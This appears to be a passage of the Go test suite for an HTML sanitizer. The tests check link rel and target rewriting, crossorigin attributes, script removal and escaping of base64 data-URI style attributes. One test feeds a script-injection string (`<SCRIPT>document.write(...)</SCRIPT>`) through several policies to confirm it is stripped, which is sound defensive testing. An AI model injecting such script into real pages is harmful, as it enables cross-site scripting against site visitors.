gICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogICAgICAgICAgICAgICAgICAgICAgICAgICAKPD94cGFja2V0IGVuZD0idyI/Pq6cYi8AAAADc0JJVAgICNvhT+AAAAN7SURBVGje7dtRSBNhHADwfxJ3L96Le0kf1GD1sBDyO5ALbEkyMyY9bHswg+FDW5B7EKVhJSeElrQUcRIkFFHoi0toPriEVi8KbUQxKSYNk8HpYE5ot4e7e/l68NT08aTp6v9/25+P7+O3/3d3H3ffB7RooSSH7IQQYu0KS4qeeeEWyHbY+qLZvbbZiEcghBBHIJ43NhrQ4oYiRUU7sQ0lFJqPizbBEViUFCWfnOmyCp4ZaV/bfHLKIwiecLYUYJTSbLid2ALJX/E+q7VnUdGz0pSDOKakA39DQrQSd8RI0cqgCLEe8rZ55zb1X5oKwLAMywJoANpOI4ZhAEBdHnA6B5ZVPalqwHCckTGLAqvi69jPwZF36yrIK6GR4NrZjrbTbK2ziVsaeba0CaD+nAtOrtU6m6rY2qbazYWH08syqOtLwUcfoamjzpCsSPNPigy5bYQQIti7xuP6VaOshsV26052Uc/mE1M9DoEQQmxuMbyqGBvwBKUU/sUog380EIYwhCEMYQhD2DGMk4VCASuGMIQhDGEIQ9hxe0Af5eDyj7ejw5PRVAGgwnLNJ/qaK+HTnRZ/bF8rc9/s86umEoKpXyb8E+nWx7NP65nM+9HuB/5T5tc3zouzs/q7Ri0d6vdHLb5GU2lNxa0txuLq6aw3scDVNHZcrsjE0jKwnEmPQnQiVLg26KvnSmwqVjb3DjXvVC8djRVOtVbvGTbmh19utY55z7Cle/NQN94/8IcYl+iq2U19m55Mmb2d51ijnR45TP7yrPvmaME1NnZrrzjy1+mo1tBp6OI6DndF2Ji/f3s03Si+6r34p0FNRb5q50ULd4iuj7Bi8reR7uFUgzjYYYFcLpfL5WT9I0sm9l2rbjQfxnWEFcvFJsIZgEi/O3LgiaVmUluMubr8UN2fkGUZl1QIQxjCEIYwhCEMYYdbUuE+D4QhDGEIQxjC/luYvBK667zE8zx/oc0XXNK3B8vL0716tsX75IOe3fzwxNtyged5vuX6QGhFNThkUfakJ0Sb4H6RyFOqrIZ7rIInmqdUSQbsxDEez+5mI3lKpRm3YOuLSAql2fi4g9gDSUObZ4vy+o2tu/dmATiOBZA1UIEzcQDAMiaO+aPV9nbtKtfkwhWW4wBUWVOh3FTFsce2YnhSAk9K4EmJvxt4UgJPSuCSCmEIQxjCEAYAAL8BrebxGP8KiJcAAAAASUVORK5CYII=" alt="">`
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			input,
			out,
			expected)
	}
}

func TestIssue55(t *testing.T) {
	p1 := NewPolicy()
	p2 := UGCPolicy()
	p3 := UGCPolicy().AllowElements("script").AllowUnsafe(true)

	in := `<SCRIPT>document.write('<h1><header/h1>')</SCRIPT>`
	expected := ``
	out := p1.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}

	expected = ``
	out = p2.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}

	expected = `<script>document.write('<h1><header/h1>')</script>`
	out = p3.Sanitize(in)
	if out != expected {
		t.Errorf(
			"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
			in,
			out,
			expected,
		)
	}
}

func TestIssue85(t *testing.T) {
	p := UGCPolicy()
	p.AllowAttrs("rel").OnElements("a")
	p.RequireNoReferrerOnLinks(true)
	p.AddTargetBlankToFullyQualifiedLinks(true)
	p.AllowAttrs("target").Matching(Paragraph).OnElements("a")

	tests := []test{
		{
			in:       `<a href="/path" />`,
			expected: `<a href="/path" rel="nofollow noreferrer"/>`,
		},
		{
			in:       `<a href="/path" target="_blank" />`,
			expected: `<a href="/path" target="_blank" rel="nofollow noreferrer noopener"/>`,
		},
		{
			in:       `<a href="/path" target="foo" />`,
			expected: `<a href="/path" target="foo" rel="nofollow noreferrer"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" />`,
			expected: `<a href="https://www.google.com/" rel="nofollow noreferrer noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" target="_blank"/>`,
			expected: `<a href="https://www.google.com/" target="_blank" rel="nofollow noreferrer noopener"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="nofollow"/>`,
			expected: `<a href="https://www.google.com/" rel="nofollow noreferrer noopener" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="noopener"/>`,
			expected: `<a href="https://www.google.com/" rel="noopener nofollow noreferrer" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="noopener nofollow" />`,
			expected: `<a href="https://www.google.com/" rel="noopener nofollow noreferrer" target="_blank"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" target="foo" />`,
			expected: `<a href="https://www.google.com/" target="_blank" rel="nofollow noreferrer noopener"/>`,
		},
		{
			in:       `<a href="https://www.google.com/" rel="external"/>`,
			expected: `<a href="https://www.google.com/" rel="external nofollow noreferrer noopener" target="_blank"/>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue107(t *testing.T) {
	p := UGCPolicy()
	p.RequireCrossOriginAnonymous(true)

	p1 := UGCPolicy()
	p1.RequireCrossOriginAnonymous(true)
	p1.AllowAttrs("crossorigin").Globally()

	tests := []test{
		{
			in:       `<img src="/path" />`,
			expected: `<img src="/path" crossorigin="anonymous"/>`,
		},
		{
			in:       `<img src="/path" crossorigin="use-credentials"/>`,
			expected: `<img src="/path" crossorigin="anonymous"/>`,
		},
		{
			in:       `<img src="/path" crossorigin=""/>`,
			expected: `<img src="/path" crossorigin="anonymous"/>`,
		},
	}

	// These tests are run concurrently to enable the race detector to pick up
	// potential issues
	wg := sync.WaitGroup{}
	wg.Add(len(tests))
	for ii, tt := range tests {
		go func(ii int, tt test) {
			out := p.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			out = p1.Sanitize(tt.in)
			if out != tt.expected {
				t.Errorf(
					"test %d failed with policy p1;\ninput   : %s\noutput  : %s\nexpected: %s",
					ii,
					tt.in,
					out,
					tt.expected,
				)
			}
			wg.Done()
		}(ii, tt)
	}
	wg.Wait()
}

func TestIssue134(t *testing.T) {
	// Do all the methods work?
	//
	// Are all the times roughly consistent?
	in := `<p style="width:100%;height:100%;background-image: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgCiAgICAgICAgICAgICAgICAgICB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCiAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgNjk2IDI1OCIgCiAgICAgICAgICAgICAgICAgICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0Ij4KPGc+Cgk8cGF0aCBmaWxsPSIjQURFMEU0IiBkPSJNMC43ODcsNTMuODI1aDQxLjY2OXYxMTMuODM4aDcyLjgxNHYzNi41MTFIMC43ODdWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTEzMy4xMDUsNTMuODI1aDEyMC4yNzV2MzYuNTE0aC03OC42MXYyNS41Nmg3MS4wOTN2MzQuNTgyaC03MS4wOTN2NTMuNjk0aC00MS42NjVWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTI2Ny4xMzQsMTI5LjQyOXYtMC40MjdjMC00My44MTYsMzQuMzY0LTc4LjE4Miw4MC45NzQtNzguMTgyYzI2LjQyMSwwLDQ1LjEwNyw4LjE2MSw2MSwyMS45MDgKCQlsLTI0LjQ4NiwyOS40MjNjLTEwLjc0LTkuMDE5LTIxLjQ3OS0xNC4xNzItMzYuMjk0LTE0LjE3MmMtMjEuNjk1LDAtMzguNDUyLDE4LjI1NC0zOC40NTIsNDEuMjM5djAuNDI1CgkJYzAsMjQuMjczLDE2Ljk2Niw0MS42NzIsNDAuODA0LDQxLjY3MmMxMC4xMDMsMCwxNy44MzYtMi4xNDYsMjQuMDYzLTYuMjMxdi0xOC4yNTdoLTI5LjY0M3YtMzAuNWg2OS4xNTl2NjcuNjU5CgkJYy0xNS44OTMsMTMuMTA0LTM4LjAxNiwyMy4xOTctNjUuMjkxLDIzLjE5N0MzMDIuMTQ3LDIwNy4xODIsMjY3LjEzNCwxNzQuOTY0LDI2Ny4xMzQsMTI5LjQyOXoiLz4KCTxwYXRoIGZpbGw9IiNBREUwRTQiIGQ9Ik00MjYuMDg3LDE4MS44MzdsMjMuMTk1LTI3LjcwOWMxNC44MjIsMTEuODE2LDMxLjM2MSwxOC4wNDEsNDguNzU1LDE4LjA0MQoJCWMxMS4xNzEsMCwxNy4xODYtMy44NjYsMTcuMTg2LTEwLjMwNnYtMC40MzdjMC02LjIyNS00Ljk0LTkuNjY1LTI1LjM0Ny0xNC4zODdjLTMyLjAwNi03LjMwMi01Ni43MDItMTYuMzIxLTU2LjcwMi00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjItNDguMTEzYzI1LjU2NCwwLDQ1LjU0Miw2Ljg3NSw2MS44NTgsMTkuOTczbC0yMC44MjksMjkuNDI5CgkJYy0xMy43NDctOS42NjgtMjguNzc4LTE0LjgxOC00Mi4wOTYtMTQuODE4Yy0xMC4wOTcsMC0xNS4wMzcsNC4yOTQtMTUuMDM3LDkuNjYzdjAuNDNjMCw2Ljg2OSw1LjE1NSw5Ljg4MSwyNS45OTIsMTQuNjA2CgkJYzM0LjU3OSw3LjUxNiw1Ni4wNTcsMTguNjg3LDU2LjA1Nyw0Ni44MTl2MC40MjdjMCwzMC43MTUtMjQuMjcxLDQ4Ljk2OS02MC43ODQsNDguOTY5CgkJQzQ2OS45MDEsMjA2Ljc0NCw0NDQuNTU3LDE5OC4zNzIsNDI2LjA4NywxODEuODM3eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTU2My45ODQsMTgxLjgzN2wyMy4xOTEtMjcuNzA5YzE0LjgyNCwxMS44MTYsMzEuMzYyLDE4LjA0MSw0OC43NTUsMTguMDQxCgkJYzExLjE3NCwwLDE3LjE4OC0zLjg2NiwxNy4xODgtMTAuMzA2di0wLjQzN2MwLTYuMjI1LTQuOTQyLTkuNjY1LTI1LjM0NC0xNC4zODdjLTMyLjAwNS03LjMwMi01Ni43MDUtMTYuMzIxLTU2LjcwNS00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjIwNS00OC4xMTNjMjUuNTU5LDAsNDUuNTM1LDYuODc1LDYxLjg1OSwxOS45NzNsLTIwLjgzOSwyOS40MjkKCQljLTEzLjc0LTkuNjY4LTI4Ljc3My0xNC44MTgtNDIuMDk3LTE0LjgxOGMtMTAuMDkxLDAtMTUuMDM1LDQuMjk0LTE1LjAzNSw5LjY2M3YwLjQzYzAsNi44NjksNS4xNTksOS44ODEsMjUuOTk1LDE0LjYwNgoJCWMzNC41NzksNy41MTYsNTYuMDU1LDE4LjY4Nyw1Ni4wNTUsNDYuODE5djAuNDI3YzAsMzAuNzE1LTI0LjI3LDQ4Ljk2OS02MC43ODUsNDguOTY5CgkJQzYwNy43OTgsMjA2Ljc0NCw1ODIuNDUzLDE5OC4zNzIsNTYzLjk4NCwxODEuODM3eiIvPgo8L2c+Cjwvc3ZnPgo=')"></p>`
	expected := `<p style="width:100%;height:100%;background-image: url(&#39;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgCiAgICAgICAgICAgICAgICAgICB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCiAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgNjk2IDI1OCIgCiAgICAgICAgICAgICAgICAgICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0Ij4KPGc+Cgk8cGF0aCBmaWxsPSIjQURFMEU0IiBkPSJNMC43ODcsNTMuODI1aDQxLjY2OXYxMTMuODM4aDcyLjgxNHYzNi41MTFIMC43ODdWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTEzMy4xMDUsNTMuODI1aDEyMC4yNzV2MzYuNTE0aC03OC42MXYyNS41Nmg3MS4wOTN2MzQuNTgyaC03MS4wOTN2NTMuNjk0aC00MS42NjVWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTI2Ny4xMzQsMTI5LjQyOXYtMC40MjdjMC00My44MTYsMzQuMzY0LTc4LjE4Miw4MC45NzQtNzguMTgyYzI2LjQyMSwwLDQ1LjEwNyw4LjE2MSw2MSwyMS45MDgKCQlsLTI0LjQ4NiwyOS40MjNjLTEwLjc0LTkuMDE5LTIxLjQ3OS0xNC4xNzItMzYuMjk0LTE0LjE3MmMtMjEuNjk1LDAtMzguNDUyLDE4LjI1NC0zOC40NTIsNDEuMjM5djAuNDI1CgkJYzAsMjQuMjczLDE2Ljk2Niw0MS42NzIsNDAuODA0LDQxLjY3MmMxMC4xMDMsMCwxNy44MzYtMi4xNDYsMjQuMDYzLTYuMjMxdi0xOC4yNTdoLTI5LjY0M3YtMzAuNWg2OS4xNTl2NjcuNjU5CgkJYy0xNS44OTMsMTMuMTA0LTM4LjAxNiwyMy4xOTctNjUuMjkxLDIzLjE5N0MzMDIuMTQ3LDIwNy4xODIsMjY3LjEzNCwxNzQuOTY0LDI2Ny4xMzQsMTI5LjQyOXoiLz4KCTxwYXRoIGZpbGw9IiNBREUwRTQiIGQ9Ik00MjYuMDg3LDE4MS44MzdsMjMuMTk1LTI3LjcwOWMxNC44MjIsMTEuODE2LDMxLjM2MSwxOC4wNDEsNDguNzU1LDE4LjA0MQoJCWMxMS4xNzEsMCwxNy4xODYtMy44NjYsMTcuMTg2LTEwLjMwNnYtMC40MzdjMC02LjIyNS00Ljk0LTkuNjY1LTI1LjM0Ny0xNC4zODdjLTMyLjAwNi03LjMwMi01Ni43MDItMTYuMzIxLTU2LjcwMi00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjItNDguMTEzYzI1LjU2NCwwLDQ1LjU0Miw2Ljg3NSw2MS44NTgsMTkuOTczbC0yMC44MjksMjkuNDI5CgkJYy0xMy43NDctOS42NjgtMjguNzc4LTE0LjgxOC00Mi4wOTYtMTQuODE4Yy0xMC4wOTcsMC0xNS4wMzcsNC4yOTQtMTUuMDM3LDkuNjYzdjAuNDNjMCw2Ljg2OSw1LjE1NSw5Ljg4MSwyNS45OTIsMTQuNjA2CgkJYzM0LjU3OSw3LjUxNiw1Ni4wNTcsMTguNjg3LDU2LjA1Nyw0Ni44MTl2MC40MjdjMCwzMC43MTUtMjQuMjcxLDQ4Ljk2OS02MC43ODQsNDguOTY5CgkJQzQ2OS45MDEsMjA2Ljc0NCw0NDQuNTU3LDE5OC4zNzIsNDI2LjA4NywxODEuODM3eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTU2My45ODQsMTgxLjgzN2wyMy4xOTEtMjcuNzA5YzE0LjgyNCwxMS44MTYsMzEuMzYyLDE4LjA0MSw0OC43NTUsMTguMDQxCgkJYzExLjE3NCwwLDE3LjE4OC0zLjg2NiwxNy4xODgtMTAuMzA2di0wLjQzN2MwLTYuMjI1LTQuOTQyLTkuNjY1LTI1LjM0NC0xNC4zODdjLTMyLjAwNS03LjMwMi01Ni43MDUtMTYuMzIxLTU2LjcwNS00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjIwNS00OC4xMTNjMjUuNTU5LDAsNDUuNTM1LDYuODc1LDYxLjg1OSwxOS45NzNsLTIwLjgzOSwyOS40MjkKCQljLTEzLjc0LTkuNjY4LTI4Ljc3My0xNC44MTgtNDIuMDk3LTE0LjgxOGMtMTAuMDkxLDAtMTUuMDM1LDQuMjk0LTE1LjAzNSw5LjY2M3YwLjQzYzAsNi44NjksNS4xNTksOS44ODEsMjUuOTk1LDE0LjYwNgoJCWMzNC41NzksNy41MTYsNTYuMDU1LDE4LjY4Nyw1Ni4wNTUsNDYuODE5djAuNDI3YzAsMzAuNzE1LTI0LjI3LDQ4Ljk2OS02MC43ODUsNDguOTY5CgkJQzYwNy43OTgsMjA2Ljc0NCw1ODIuNDUzLDE5OC4zNzIsNTYzLjk4NCwxODEuODM3eiIvPgo8L2c+Cjwvc3ZnPgo=&#39;)"></p>`

	p := UGCPolicy()
	p.AllowAttrs("style").OnElements("p")

	t.Run("Sanitize", func(t *testing.T) {
		out := p.Sanitize(in)
		if out != expected {
			t.Errorf(
				"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				in,
				out,
				expected,
			)
		}
	})

	t.Run("SanitizeReader", func(t *testing.T) {
		out := p.SanitizeReader(strings.NewReader(in)).String()
		if out != expected {
			t.Errorf(
				"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				in,
				out,
				expected,
			)
		}
	})

	t.Run("SanitizeBytes", func(t *testing.T) {
		out := string(p.SanitizeBytes([]byte(in)))
		if out != expected {
			t.Errorf(
				"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				in,
				out,
				expected,
			)
		}
	})

	t.Run("SanitizeReaderToWriter", func(t *testing.T) {
		var buff bytes.Buffer
		var out string
		p.SanitizeReaderToWriter(strings.NewReader(in), &buff)
		out = (&buff).String()
		if out != expected {
			t.Errorf(
				"test failed;\ninput   : %s\noutput  : %s\nexpected: %s",
				in,
				out,
				expected,
			)
		}
	})
}

func TestIssue139(t *testing.T) {
	// HTML escaping of attribute values appears to occur twice
	tests := []test{
		{
			in:       `<p style="width:100%;height:100%;background-image: url('data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgCiAgICAgICAgICAgICAgICAgICB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCiAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgNjk2IDI1OCIgCiAgICAgICAgICAgICAgICAgICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0Ij4KPGc+Cgk8cGF0aCBmaWxsPSIjQURFMEU0IiBkPSJNMC43ODcsNTMuODI1aDQxLjY2OXYxMTMuODM4aDcyLjgxNHYzNi41MTFIMC43ODdWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTEzMy4xMDUsNTMuODI1aDEyMC4yNzV2MzYuNTE0aC03OC42MXYyNS41Nmg3MS4wOTN2MzQuNTgyaC03MS4wOTN2NTMuNjk0aC00MS42NjVWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTI2Ny4xMzQsMTI5LjQyOXYtMC40MjdjMC00My44MTYsMzQuMzY0LTc4LjE4Miw4MC45NzQtNzguMTgyYzI2LjQyMSwwLDQ1LjEwNyw4LjE2MSw2MSwyMS45MDgKCQlsLTI0LjQ4NiwyOS40MjNjLTEwLjc0LTkuMDE5LTIxLjQ3OS0xNC4xNzItMzYuMjk0LTE0LjE3MmMtMjEuNjk1LDAtMzguNDUyLDE4LjI1NC0zOC40NTIsNDEuMjM5djAuNDI1CgkJYzAsMjQuMjczLDE2Ljk2Niw0MS42NzIsNDAuODA0LDQxLjY3MmMxMC4xMDMsMCwxNy44MzYtMi4xNDYsMjQuMDYzLTYuMjMxdi0xOC4yNTdoLTI5LjY0M3YtMzAuNWg2OS4xNTl2NjcuNjU5CgkJYy0xNS44OTMsMTMuMTA0LTM4LjAxNiwyMy4xOTctNjUuMjkxLDIzLjE5N0MzMDIuMTQ3LDIwNy4xODIsMjY3LjEzNCwxNzQuOTY0LDI2Ny4xMzQsMTI5LjQyOXoiLz4KCTxwYXRoIGZpbGw9IiNBREUwRTQiIGQ9Ik00MjYuMDg3LDE4MS44MzdsMjMuMTk1LTI3LjcwOWMxNC44MjIsMTEuODE2LDMxLjM2MSwxOC4wNDEsNDguNzU1LDE4LjA0MQoJCWMxMS4xNzEsMCwxNy4xODYtMy44NjYsMTcuMTg2LTEwLjMwNnYtMC40MzdjMC02LjIyNS00Ljk0LTkuNjY1LTI1LjM0Ny0xNC4zODdjLTMyLjAwNi03LjMwMi01Ni43MDItMTYuMzIxLTU2LjcwMi00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjItNDguMTEzYzI1LjU2NCwwLDQ1LjU0Miw2Ljg3NSw2MS44NTgsMTkuOTczbC0yMC44MjksMjkuNDI5CgkJYy0xMy43NDctOS42NjgtMjguNzc4LTE0LjgxOC00Mi4wOTYtMTQuODE4Yy0xMC4wOTcsMC0xNS4wMzcsNC4yOTQtMTUuMDM3LDkuNjYzdjAuNDNjMCw2Ljg2OSw1LjE1NSw5Ljg4MSwyNS45OTIsMTQuNjA2CgkJYzM0LjU3OSw3LjUxNiw1Ni4wNTcsMTguNjg3LDU2LjA1Nyw0Ni44MTl2MC40MjdjMCwzMC43MTUtMjQuMjcxLDQ4Ljk2OS02MC43ODQsNDguOTY5CgkJQzQ2OS45MDEsMjA2Ljc0NCw0NDQuNTU3LDE5OC4zNzIsNDI2LjA4NywxODEuODM3eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTU2My45ODQsMTgxLjgzN2wyMy4xOTEtMjcuNzA5YzE0LjgyNCwxMS44MTYsMzEuMzYyLDE4LjA0MSw0OC43NTUsMTguMDQxCgkJYzExLjE3NCwwLDE3LjE4OC0zLjg2NiwxNy4xODgtMTAuMzA2di0wLjQzN2MwLTYuMjI1LTQuOTQyLTkuNjY1LTI1LjM0NC0xNC4zODdjLTMyLjAwNS03LjMwMi01Ni43MDUtMTYuMzIxLTU2LjcwNS00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjIwNS00OC4xMTNjMjUuNTU5LDAsNDUuNTM1LDYuODc1LDYxLjg1OSwxOS45NzNsLTIwLjgzOSwyOS40MjkKCQljLTEzLjc0LTkuNjY4LTI4Ljc3My0xNC44MTgtNDIuMDk3LTE0LjgxOGMtMTAuMDkxLDAtMTUuMDM1LDQuMjk0LTE1LjAzNSw5LjY2M3YwLjQzYzAsNi44NjksNS4xNTksOS44ODEsMjUuOTk1LDE0LjYwNgoJCWMzNC41NzksNy41MTYsNTYuMDU1LDE4LjY4Nyw1Ni4wNTUsNDYuODE5djAuNDI3YzAsMzAuNzE1LTI0LjI3LDQ4Ljk2OS02MC43ODUsNDguOTY5CgkJQzYwNy43OTgsMjA2Ljc0NCw1ODIuNDUzLDE5OC4zNzIsNTYzLjk4NCwxODEuODM3eiIvPgo8L2c+Cjwvc3ZnPgo=')"></p>`,
			expected: `<p style="width:100%;height:100%;background-image: url(&#39;data:image/svg+xml;base64,PD94bWwgdmVyc2lvbj0iMS4wIiBlbmNvZGluZz0idXRmLTgiPz4KPCFET0NUWVBFIHN2ZyBQVUJMSUMgIi0vL1czQy8vRFREIFNWRyAxLjEvL0VOIiAiaHR0cDovL3d3dy53My5vcmcvR3JhcGhpY3MvU1ZHLzEuMS9EVEQvc3ZnMTEuZHRkIj4KPHN2ZyB2ZXJzaW9uPSIxLjEiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyIgCiAgICAgICAgICAgICAgICAgICB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayIgCiAgICAgICAgICAgICAgICAgICB2aWV3Qm94PSIwIDAgNjk2IDI1OCIgCiAgICAgICAgICAgICAgICAgICBwcmVzZXJ2ZUFzcGVjdFJhdGlvPSJ4TWlkWU1pZCBtZWV0Ij4KPGc+Cgk8cGF0aCBmaWxsPSIjQURFMEU0IiBkPSJNMC43ODcsNTMuODI1aDQxLjY2OXYxMTMuODM4aDcyLjgxNHYzNi41MTFIMC43ODdWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTEzMy4xMDUsNTMuODI1aDEyMC4yNzV2MzYuNTE0aC03OC42MXYyNS41Nmg3MS4wOTN2MzQuNTgyaC03MS4wOTN2NTMuNjk0aC00MS42NjVWNTMuODI1eiIvPgoJPHBhdGggZmlsbD0iI0FERTBFNCIgZD0iTTI2Ny4xMzQsMTI5LjQyOXYtMC40MjdjMC00My44MTYsMzQuMzY0LTc4LjE4Miw4MC45NzQtNzguMTgyYzI2LjQyMSwwLDQ1LjEwNyw4LjE2MSw2MSwyMS45MDgKCQlsLTI0LjQ4NiwyOS40MjNjLTEwLjc0LTkuMDE5LTIxLjQ3OS0xNC4xNzItMzYuMjk0LTE0LjE3MmMtMjEuNjk1LDAtMzguNDUyLDE4LjI1NC0zOC40NTIsNDEuMjM5djAuNDI1CgkJYzAsMjQuMjczLDE2Ljk2Niw0MS42NzIsNDAuODA0LDQxLjY3MmMxMC4xMDMsMCwxNy44MzYtMi4xNDYsMjQuMDYzLTYuMjMxdi0xOC4yNTdoLTI5LjY0M3YtMzAuNWg2OS4xNTl2NjcuNjU5CgkJYy0xNS44OTMsMTMuMTA0LTM4LjAxNiwyMy4xOTctNjUuMjkxLDIzLjE5N0MzMDIuMTQ3LDIwNy4xODIsMjY3LjEzNCwxNzQuOTY0LDI2Ny4xMzQsMTI5LjQyOXoiLz4KCTxwYXRoIGZpbGw9IiNBREUwRTQiIGQ9Ik00MjYuMDg3LDE4MS44MzdsMjMuMTk1LTI3LjcwOWMxNC44MjIsMTEuODE2LDMxLjM2MSwxOC4wNDEsNDguNzU1LDE4LjA0MQoJCWMxMS4xNzEsMCwxNy4xODYtMy44NjYsMTcuMTg2LTEwLjMwNnYtMC40MzdjMC02LjIyNS00Ljk0LTkuNjY1LTI1LjM0Ny0xNC4zODdjLTMyLjAwNi03LjMwMi01Ni43MDItMTYuMzIxLTU2LjcwMi00Ny4yNXYtMC40MwoJCWMwLTI3LjkyMiwyMi4xMjMtNDguMTEzLDU4LjItNDguMTEzYzI1LjU2NCwwLDQ1LjU0Miw2Ljg3NSw2MS44NTgsMTkuOTczbC0yMC44MjksMjkuNDI5CgkJYy0xMy43NDctOS42NjgtMjguNzc4LTE0LjgxOC00Mi4wOTYtMTQuODE4Yy0xMC4wOTcsMC0xNS4wMzcsNC4yOTQtMTUuMDM3LDkuNjYzdjAuNDNjMCw2Ljg2OSw1LjE1NSw5Ljg4MSwyNS45OTIsMTQuNjA2CgkJYzM0LjU3OSw3LjUxNiw1Ni4wNTcsMTguNjg3LDU2LjA1Nyw0Ni44MTl2MC40MjdjMCwzMC43MTUtMjQuMjcxLD